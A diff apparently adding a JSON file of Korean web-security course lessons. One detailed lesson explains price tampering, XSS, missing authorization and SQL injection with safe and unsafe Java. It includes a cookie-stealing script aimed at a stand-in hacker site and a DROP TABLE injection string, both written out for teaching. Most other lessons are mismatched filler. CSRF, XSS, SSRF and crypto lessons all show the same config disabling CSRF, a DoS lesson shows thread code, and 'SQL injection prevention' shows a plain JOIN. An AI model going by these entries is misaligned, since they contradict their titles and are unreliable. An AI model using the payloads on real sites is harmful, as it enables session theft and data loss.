@@ -1,0 +1,791 @@
+{
+  "01_기초/owasp-top10": {
+    "id": "01_기초/owasp-top10",
+    "title": "Owasp Top10",
+    "category": "security",
+    "subCategory": "01_기초",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Owasp Top10",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "01_기초/security-intro": {
+    "id": "01_기초/security-intro",
+    "title": "왜 백엔드가 필요한가? - HTML만으로는 위험한 이유",
+    "category": "security",
+    "subCategory": "01_기초",
+    "language": "Java",
+    "description": "HTML 유지보수 개발자를 위한 보안 필수 강의. 왜 Java/Python 백엔드가 없으면 사이트가 털리는지, 충격적인 해킹 시나리오와 함께 배웁니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🚨 충격 시나리오: HTML만 있으면 일어나는 대참사",
+        "content": "**당신의 쇼핑몰이 5분 만에 파산하는 방법**\n\n당신이 만든 쇼핑몰 결제 페이지입니다:\n\n```html\n<!-- 결제 페이지 (payment.html) -->\n<form action=\"/pay\" method=\"POST\">\n  <p>상품: 맥북 프로 16인치</p>\n  <input type=\"hidden\" name=\"price\" value=\"3990000\">  <!-- 399만원 -->\n  <button type=\"submit\">결제하기</button>\n</form>\n```\n\n**해커의 공격 (F12 개발자 도구)**\n\n1. F12 눌러서 개발자 도구 열기\n2. `value=\"3990000\"` 찾기\n3. `value=\"0\"` 으로 수정\n4. 결제 버튼 클릭\n\n```html\n<!-- 해커가 수정한 코드 -->\n<input type=\"hidden\" name=\"price\" value=\"0\">  <!-- 0원으로 변조! -->\n```\n\n**결과:**\n- 399만원짜리 맥북을 **0원**에 구매 완료\n- 서버에 도착한 데이터: `{ price: 0, product: \"맥북\" }`\n- DB에 저장: 주문 완료, 결제금액 0원\n- **당신의 쇼핑몰: 파산** 💀\n\n---\n\n**왜 이런 일이 벌어지나?**\n\n```\n[브라우저]          [서버]\n    │                 │\n    │  HTML 렌더링    │\n    │◀────────────────│\n    │                 │\n    │  🔓 HTML 조작   │  ← 해커가 여기서 값을 바꿈\n    │  (F12로 변조)   │\n    │                 │\n    │  POST 요청      │\n    │────────────────▶│\n    │  price=0        │  ← 서버는 \"0원이네, OK\" 처리\n    │                 │\n```\n\n**핵심 문제:**\nHTML은 **클라이언트(브라우저)**에 있고, 클라이언트는 **해커의 영역**입니다.\n사용자가 보내는 모든 데이터는 **조작될 수 있습니다**."
+      },
+      {
+        "type": "concept",
+        "title": "🏦 Java가 막아내는 방법 - 은행 금고 비유",
+        "content": "**비유: 은행 금고 시스템**\n\n```\n┌─────────────────────────────────────────────────────────┐\n│                    🏦 은행 (서버)                         │\n├─────────────────────────────────────────────────────────┤\n│                                                         │\n│   📋 고객이 적어온 출금 요청서 (HTTP 요청)                │\n│   \"100만원 출금해주세요\"                                 │\n│                                                         │\n│   ❌ 그대로 믿고 처리? → 사기꾼이 \"1억 출금\" 적어옴!      │\n│                                                         │\n│   ✅ 은행 직원(Java 백엔드)이 하는 일:                    │\n│   1. 신분증 확인 (인증 - Authentication)                 │\n│   2. 계좌 잔액 확인 (검증 - Validation)                  │\n│   3. 출금 권한 확인 (인가 - Authorization)               │\n│   4. 금고에서 직접 계산 (서버에서 가격 조회)              │\n│                                                         │\n└─────────────────────────────────────────────────────────┘\n```\n\n**Java 코드로 보는 \"금고 시스템\"**\n\n```java\n// ❌ 위험한 코드 - HTML에서 온 가격을 그대로 믿음\n@PostMapping(\"/pay\")\npublic String pay(@RequestParam int price) {\n    // 해커가 0원 보내면 0원으로 결제됨!\n    orderService.pay(price);  \n    return \"결제 완료\";\n}\n```\n\n```java\n// ✅ 안전한 코드 - 서버의 금고(DB)에서 직접 가격 조회\n@PostMapping(\"/pay\")\npublic String pay(@RequestParam Long productId, HttpSession session) {\n    \n    // 1. 로그인 확인 (신분증 검사)\n    User user = (User) session.getAttribute(\"user\");\n    if (user == null) {\n        throw new UnauthorizedException(\"로그인이 필요합니다\");\n    }\n    \n    // 2. 서버 DB에서 가격 직접 조회 (금고에서 직접 확인)\n    Product product = productRepository.findById(productId);\n    int realPrice = product.getPrice();  // 399만원\n    \n    // 3. 결제 처리 (해커가 뭘 보내든 DB 가격으로 처리)\n    paymentService.charge(user, realPrice);\n    \n    return \"결제 완료: \" + realPrice + \"원\";\n}\n```\n\n**핵심 원칙:**\n> **\"클라이언트를 절대 믿지 마라\" (Never Trust the Client)**\n>\n> 가격, 수량, 할인율 등 중요한 값은 반드시 서버에서 직접 조회!"
+      },
+      {
+        "type": "code",
+        "language": "java",
+        "title": "☕ Java의 캡슐화(Private)가 보안인 이유",
+        "code": "// ═══════════════════════════════════════════════════════════\n// 캡슐화: \"금고 열쇠는 은행 직원만 가지고 있다\"\n// ═══════════════════════════════════════════════════════════\n\n// ❌ 위험: public 필드 - 아무나 접근 가능\npublic class Product {\n    public int price = 3990000;  // 해커: \"이거 0으로 바꾸면 되겠네\"\n}\n\n// ✅ 안전: private 필드 + 검증 로직\npublic class Product {\n    \n    private int price;  // 🔒 외부에서 직접 접근 불가능\n    \n    // 생성자에서만 설정 가능\n    public Product(int price) {\n        if (price < 0) {\n            throw new IllegalArgumentException(\"가격은 0 이상이어야 합니다\");\n        }\n        this.price = price;\n    }\n    \n    // 읽기만 허용 (Getter)\n    public int getPrice() {\n        return this.price;  // 읽을 수는 있지만 바꿀 수는 없음\n    }\n    \n    // ❌ Setter가 없음 = 외부에서 가격 변경 불가능!\n    // public void setPrice(int price) { ... }  // 이거 없음!\n}\n\n// ═══════════════════════════════════════════════════════════\n// 사용 예시\n// ═══════════════════════════════════════════════════════════\n\nProduct macbook = new Product(3990000);\n\n// ❌ 해커 시도: 직접 값 변경 → 컴파일 에러!\nmacbook.price = 0;  // Error: price has private access\n\n// ✅ 안전: 읽기만 가능\nint price = macbook.getPrice();  // 3990000\n\n// ═══════════════════════════════════════════════════════════\n// 결론: private + 메서드 = 데이터 보호\n// ═══════════════════════════════════════════════════════════\n//\n// 은행 금고(private 필드)는 금고 열쇠(메서드)로만 접근 가능\n// 고객(외부 코드)이 직접 금고를 열 수 없음"
+      },
+      {
+        "type": "concept",
+        "title": "🐍 Python의 자동화 = 안정성 + 보안",
+        "content": "**시나리오: HTML 파일 1,000개 수정해야 할 때**\n\n회사에서 로고 URL을 변경해야 합니다:\n- `logo-old.png` → `logo-new.png`\n- 수정 대상: 1,000개 HTML 파일\n\n---\n\n**❌ 사람이 수동으로 하면?**\n\n```\n작업 시간: 8시간 (파일당 30초)\n예상 실수:\n- 오타: log-new.png (o 빠짐)\n- 누락: 50개 파일 깜빡함\n- 잘못된 파일 수정: CSS 파일 건드림\n- 백업 안 함: 되돌릴 수 없음\n\n결과: 사이트 일부 페이지에서 로고 깨짐 🔥\n      고객 클레임, 신뢰도 하락\n```\n\n---\n\n**✅ Python 스크립트 (30초 작성, 3초 실행)**\n\n```python\nimport os\nimport shutil\n\n# 설정\nTARGET_DIR = \"./public\"\nOLD_LOGO = \"logo-old.png\"\nNEW_LOGO = \"logo-new.png\"\n\ndef update_logo_in_files():\n    \"\"\"모든 HTML 파일에서 로고 URL 변경\"\"\"\n    \n    changed_files = []\n    errors = []\n    \n    # 1. 모든 HTML 파일 찾기\n    for root, dirs, files in os.walk(TARGET_DIR):\n        for file in files:\n            if file.endswith(\".html\"):\n                filepath = os.path.join(root, file)\n                \n                try:\n                    # 2. 파일 읽기\n                    with open(filepath, 'r', encoding='utf-8') as f:\n                        content = f.read()\n                    \n                    # 3. 변경 필요한지 확인\n                    if OLD_LOGO in content:\n                        # 4. 백업 생성 (자동!)\n                        shutil.copy(filepath, filepath + \".backup\")\n                        \n                        # 5. 변경 적용\n                        new_content = content.replace(OLD_LOGO, NEW_LOGO)\n                        \n                        with open(filepath, 'w', encoding='utf-8') as f:\n                            f.write(new_content)\n                        \n                        changed_files.append(filepath)\n                        \n                except Exception as e:\n                    errors.append(f\"{filepath}: {e}\")\n    \n    # 6. 결과 리포트\n    print(f\"✅ 수정 완료: {len(changed_files)}개 파일\")\n    print(f\"❌ 에러: {len(errors)}개\")\n    \n    return changed_files, errors\n\n# 실행\nupdate_logo_in_files()\n```\n\n---\n\n**비교 결과:**\n\n| 항목 | 수동 작업 | Python 자동화 |\n|------|----------|---------------|\n| 시간 | 8시간 | 3초 |\n| 실수 확률 | 5% (50개 오류) | 0% |\n| 백업 | 깜빡함 | 자동 생성 |\n| 검증 | 눈으로 확인 | 로그로 확인 |\n| 재현 가능 | 불가능 | 언제든 재실행 |\n\n**\"자동화 = 보안\"인 이유:**\n- 실수 = 취약점 (잘못된 파일에 민감 정보 노출 등)\n- 자동화 = 실수 제거 = 취약점 제거"
+      },
+      {
+        "type": "code",
+        "language": "python",
+        "title": "🔄 Python의 def와 for가 안정성을 만드는 원리",
+        "code": "# ═══════════════════════════════════════════════════════════\n# def (함수): \"한 번 만들면 100번 똑같이 동작\"\n# ═══════════════════════════════════════════════════════════\n\ndef validate_email(email: str) -> bool:\n    \"\"\"\n    이메일 유효성 검사 - 한 번 정의하면 모든 곳에서 동일하게 검증\n    \n    사람이 매번 확인하면:\n    - \"이거 @ 있나?\" (가끔 깜빡함)\n    - \"도메인 맞나?\" (피곤하면 놓침)\n    \n    함수로 정의하면:\n    - 100만 번 실행해도 똑같은 검증\n    - 실수 확률 0%\n    \"\"\"\n    import re\n    \n    # 이메일 정규식 패턴\n    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'\n    \n    if not email:\n        return False\n    \n    if len(email) > 254:  # 이메일 최대 길이\n        return False\n        \n    return bool(re.match(pattern, email))\n\n\n# 사용: 1000명의 사용자 이메일 검증\nemails = [\"user@example.com\", \"hacker<script>\", \"admin@site.org\", ...]\n\nfor email in emails:\n    if validate_email(email):\n        save_to_db(email)\n    else:\n        log_suspicious_input(email)  # 의심스러운 입력 기록\n\n\n# ═══════════════════════════════════════════════════════════\n# for (반복문): \"1000번 해도 지치지 않는 검사관\"\n# ═══════════════════════════════════════════════════════════\n\ndef scan_security_headers(urls: list) -> dict:\n    \"\"\"\n    여러 URL의 보안 헤더 검사\n    \n    사람이 1000개 URL 검사:\n    - 3시간 소요\n    - 100번째부터 집중력 저하\n    - 필수 헤더 누락 발견 못함\n    \n    Python for문:\n    - 10초 소요\n    - 1000번째도 첫 번째와 동일한 정확도\n    \"\"\"\n    import requests\n    \n    REQUIRED_HEADERS = [\n        'X-Content-Type-Options',\n        'X-Frame-Options', \n        'Content-Security-Policy',\n        'Strict-Transport-Security'\n    ]\n    \n    results = {}\n    \n    for url in urls:  # 1000개 URL 순회\n        try:\n            response = requests.head(url, timeout=5)\n            \n            missing = []\n            for header in REQUIRED_HEADERS:  # 4개 헤더 검사\n                if header not in response.headers:\n                    missing.append(header)\n            \n            results[url] = {\n                'status': 'PASS' if not missing else 'FAIL',\n                'missing_headers': missing\n            }\n            \n        except Exception as e:\n            results[url] = {'status': 'ERROR', 'message': str(e)}\n    \n    return results\n\n\n# 실행\nurls = [\"https://site1.com\", \"https://site2.com\", ...]  # 1000개\nreport = scan_security_headers(urls)\n\n# 결과: 어떤 사이트에 보안 헤더가 빠졌는지 정확히 파악\nfor url, result in report.items():\n    if result['status'] == 'FAIL':\n        print(f\"⚠️ {url}: {result['missing_headers']}\")"
+      },
+      {
+        "type": "concept",
+        "title": "🛡️ 유지보수 개발자의 보안 체크리스트 3가지",
+        "content": "**유지보수할 때 반드시 확인해야 할 3가지 방패**\n\n---\n\n## 1️⃣ 유효성 검사 (Validation)\n**\"이메일 칸에 이상한 스크립트 넣는 놈 막기\"**\n\n```\n[공격 시나리오]\n해커가 이메일 입력란에 입력:\n<script>document.location='http://해커사이트.com/steal?cookie='+document.cookie</script>\n\n[결과 - 검증 없으면]\n- 이 코드가 DB에 저장됨\n- 다른 사용자가 해당 페이지 방문\n- 스크립트 실행 → 쿠키(로그인 정보) 탈취\n- 해커가 그 사용자로 로그인 가능 (세션 하이재킹)\n```\n\n---\n\n## 2️⃣ 권한 체크 (Authorization)\n**\"관리자 페이지에 주소 치고 들어오는 놈 막기\"**\n\n```\n[공격 시나리오]\n일반 사용자가 주소창에 직접 입력:\nhttps://yoursite.com/admin/users/delete/123\n\n[결과 - 권한 체크 없으면]\n- 관리자 페이지가 그냥 열림\n- 다른 사용자 삭제 가능\n- 전체 회원 정보 조회 가능\n```\n\n---\n\n## 3️⃣ SQL 인젝션 방지\n**\"검색창에 DB 삭제 명령 치는 놈 막기\"**\n\n```\n[공격 시나리오]\n검색창에 입력:\n'; DROP TABLE users; --\n\n[서버에서 실행되는 쿼리]\nSELECT * FROM products WHERE name = ''; DROP TABLE users; --'\n\n[결과 - 방어 없으면]\n- users 테이블 삭제됨\n- 모든 회원 정보 소실\n- 사이트 접속 불가\n```"
+      },
+      {
+        "type": "code",
+        "language": "java",
+        "title": "🛡️ 보안 체크리스트 - Java 구현 코드",
+        "code": "// ═══════════════════════════════════════════════════════════\n// 1️⃣ 유효성 검사 (Validation) - XSS 방지\n// ═══════════════════════════════════════════════════════════\n\n@RestController\npublic class UserController {\n    \n    // ❌ 위험: 검증 없이 그대로 저장\n    @PostMapping(\"/register-unsafe\")\n    public String registerUnsafe(@RequestBody User user) {\n        userRepository.save(user);  // <script>...</script> 그대로 저장!\n        return \"가입 완료\";\n    }\n    \n    // ✅ 안전: Bean Validation + 직접 검증\n    @PostMapping(\"/register\")\n    public String register(@Valid @RequestBody User user) {\n        // @Valid가 자동으로 검증 (아래 User 클래스 참고)\n        userRepository.save(user);\n        return \"가입 완료\";\n    }\n}\n\n// User 엔티티에 검증 어노테이션 추가\npublic class User {\n    \n    @Email(message = \"올바른 이메일 형식이 아닙니다\")\n    @NotBlank(message = \"이메일은 필수입니다\")\n    private String email;\n    \n    @Size(min = 2, max = 20, message = \"이름은 2~20자\")\n    @Pattern(regexp = \"^[가-힣a-zA-Z]+$\", message = \"이름에 특수문자 불가\")\n    private String name;\n    \n    @Size(min = 8, message = \"비밀번호는 8자 이상\")\n    private String password;\n}\n\n// ═══════════════════════════════════════════════════════════\n// 2️⃣ 권한 체크 (Authorization) - URL 직접 접근 방지\n// ═══════════════════════════════════════════════════════════\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(auth -> auth\n                // 누구나 접근 가능\n                .requestMatchers(\"/\", \"/login\", \"/register\").permitAll()\n                \n                // 로그인한 사용자만\n                .requestMatchers(\"/mypage/**\").authenticated()\n                \n                // 관리자만! (ADMIN 권한 필수)\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                \n                // 나머지는 모두 인증 필요\n                .anyRequest().authenticated()\n            );\n        \n        return http.build();\n    }\n}\n\n// 컨트롤러에서 추가 권한 체크\n@RestController\n@RequestMapping(\"/admin\")\npublic class AdminController {\n    \n    @PreAuthorize(\"hasRole('ADMIN')\")\n    @DeleteMapping(\"/users/{id}\")\n    public String deleteUser(@PathVariable Long id, Authentication auth) {\n        // 본인 삭제 방지\n        if (id.equals(auth.getPrincipal().getId())) {\n            throw new IllegalArgumentException(\"본인은 삭제할 수 없습니다\");\n        }\n        userService.delete(id);\n        return \"삭제 완료\";\n    }\n}\n\n// ═══════════════════════════════════════════════════════════\n// 3️⃣ SQL 인젝션 방지 - PreparedStatement 사용\n// ═══════════════════════════════════════════════════════════\n\n@Repository\npublic class ProductRepository {\n    \n    // ❌ 위험: 문자열 연결 → SQL 인젝션 가능\n    public List<Product> searchUnsafe(String keyword) {\n        String sql = \"SELECT * FROM products WHERE name = '\" + keyword + \"'\";\n        // keyword = \"'; DROP TABLE products; --\" 이면 테이블 삭제됨!\n        return jdbcTemplate.query(sql, productMapper);\n    }\n    \n    // ✅ 안전: PreparedStatement (파라미터 바인딩)\n    public List<Product> searchSafe(String keyword) {\n        String sql = \"SELECT * FROM products WHERE name = ?\";\n        // ? 자리에 keyword가 \"문자열\"로 안전하게 들어감\n        // 해커가 뭘 넣어도 SQL 명령으로 실행 안 됨!\n        return jdbcTemplate.query(sql, productMapper, keyword);\n    }\n    \n    // ✅ 더 안전: JPA 사용 (자동으로 파라미터 바인딩)\n    // Spring Data JPA는 기본적으로 SQL 인젝션 방지됨\n    public interface ProductJpaRepository extends JpaRepository<Product, Long> {\n        \n        List<Product> findByNameContaining(String keyword);\n        // 내부적으로 PreparedStatement 사용\n        \n        @Query(\"SELECT p FROM Product p WHERE p.name LIKE %:keyword%\")\n        List<Product> search(@Param(\"keyword\") String keyword);\n        // JPQL도 파라미터 바인딩으로 안전\n    }\n}"
+      },
+      {
+        "type": "tip",
+        "title": "💡 핵심 정리: 왜 백엔드를 배워야 하는가?",
+        "content": "**HTML만으로는 절대 막을 수 없는 것들:**\n\n| 공격 | HTML만 | + Backend |\n|------|--------|------------|\n| 가격 조작 | 0원 결제 성공 | 서버에서 가격 검증 |\n| XSS 스크립트 | 그대로 저장/실행 | 입력값 검증 후 이스케이프 |\n| 관리자 페이지 | URL 치면 접속 | 권한 없으면 403 에러 |\n| SQL 인젝션 | DB 삭제됨 | PreparedStatement로 차단 |\n| 세션 탈취 | 해커가 로그인 | HttpOnly 쿠키 + 서버 검증 |\n\n---\n\n**\"보안 = 서버에서 하는 것\"**\n\n```\n클라이언트(HTML, JS)  →  \"예쁘게 보여주기\" (Presentation)\n서버(Java, Python)    →  \"안전하게 처리하기\" (Protection)\n```\n\n**유지보수 개발자로서 기억할 것:**\n\n1. **클라이언트를 믿지 마라** - 모든 입력값은 서버에서 재검증\n2. **중요 데이터는 서버에서 조회** - 가격, 재고, 권한 등\n3. **자동화로 실수를 제거** - Python 스크립트 활용\n4. **체크리스트를 습관화** - Validation, Authorization, SQL Injection\n\n---\n\n**결론:**\n> \"Java/Python을 배우는 건 코딩 실력 향상이 아니라,\n> **당신의 사이트와 고객을 지키는 방패를 만드는 것**입니다.\""
+      }
+    ]
+  },
+  "01_기초/security-triad": {
+    "id": "01_기초/security-triad",
+    "title": "Security Triad",
+    "category": "security",
+    "subCategory": "01_기초",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Security Triad",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/clickjacking": {
+    "id": "02_공격/clickjacking",
+    "title": "Clickjacking",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Clickjacking",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/csrf-prevent": {
+    "id": "02_공격/csrf-prevent",
+    "title": "Csrf Prevent",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Csrf Prevent",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/csrf-prevention": {
+    "id": "02_공격/csrf-prevention",
+    "title": "Csrf Prevention",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Csrf Prevention",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/csrf": {
+    "id": "02_공격/csrf",
+    "title": "Csrf",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Csrf",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/dos-ddos": {
+    "id": "02_공격/dos-ddos",
+    "title": "Dos Ddos",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "C",
+    "description": "프로세스 메모리 구조와 스레드 간의 컨텍스트 스위칭 원리를 파악합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Dos Ddos",
+        "content": "프로세스 메모리 구조와 스레드 간의 컨텍스트 스위칭 원리를 파악합니다."
+      },
+      {
+        "type": "code",
+        "language": "C",
+        "code": "#include <pthread.h>\r\n\r\nvoid* thread_func(void* arg) {\r\n    printf(\"Thread Running\\n\");\r\n    return NULL;\r\n}\r\n\r\nint main() {\r\n    pthread_t thread;\r\n    pthread_create(&thread, NULL, thread_func, NULL);\r\n    pthread_join(thread, NULL);\r\n    return 0;\r\n}"
+      }
+    ]
+  },
+  "02_공격/sql-injection-prevent": {
+    "id": "02_공격/sql-injection-prevent",
+    "title": "Sql Injection Prevent",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "SQL",
+    "description": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Sql Injection Prevent",
+        "content": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다."
+      },
+      {
+        "type": "code",
+        "language": "SQL",
+        "code": "SELECT u.name, o.order_date\r\nFROM users u\r\nJOIN orders o ON u.id = o.user_id\r\nWHERE u.active = 1;"
+      }
+    ]
+  },
+  "02_공격/sql-injection-prevention": {
+    "id": "02_공격/sql-injection-prevention",
+    "title": "Sql Injection Prevention",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "SQL",
+    "description": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Sql Injection Prevention",
+        "content": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다."
+      },
+      {
+        "type": "code",
+        "language": "SQL",
+        "code": "SELECT u.name, o.order_date\r\nFROM users u\r\nJOIN orders o ON u.id = o.user_id\r\nWHERE u.active = 1;"
+      }
+    ]
+  },
+  "02_공격/sql-injection": {
+    "id": "02_공격/sql-injection",
+    "title": "Sql Injection",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "SQL",
+    "description": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Sql Injection",
+        "content": "CRUD 쿼리 작성법과 다양한 JOIN 기법을 실습합니다."
+      },
+      {
+        "type": "code",
+        "language": "SQL",
+        "code": "SELECT u.name, o.order_date\r\nFROM users u\r\nJOIN orders o ON u.id = o.user_id\r\nWHERE u.active = 1;"
+      }
+    ]
+  },
+  "02_공격/ssrf": {
+    "id": "02_공격/ssrf",
+    "title": "Ssrf",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Ssrf",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/xss-prevent": {
+    "id": "02_공격/xss-prevent",
+    "title": "Xss Prevent",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Xss Prevent",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/xss-prevention": {
+    "id": "02_공격/xss-prevention",
+    "title": "Xss Prevention",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Xss Prevention",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "02_공격/xss": {
+    "id": "02_공격/xss",
+    "title": "Xss",
+    "category": "security",
+    "subCategory": "02_공격",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Xss",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_암호화/asymmetric": {
+    "id": "03_암호화/asymmetric",
+    "title": "Asymmetric",
+    "category": "security",
+    "subCategory": "03_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Asymmetric",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_암호화/hash": {
+    "id": "03_암호화/hash",
+    "title": "Hash",
+    "category": "security",
+    "subCategory": "03_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Hash",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_암호화/https-tls": {
+    "id": "03_암호화/https-tls",
+    "title": "Https Tls",
+    "category": "security",
+    "subCategory": "03_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Https Tls",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
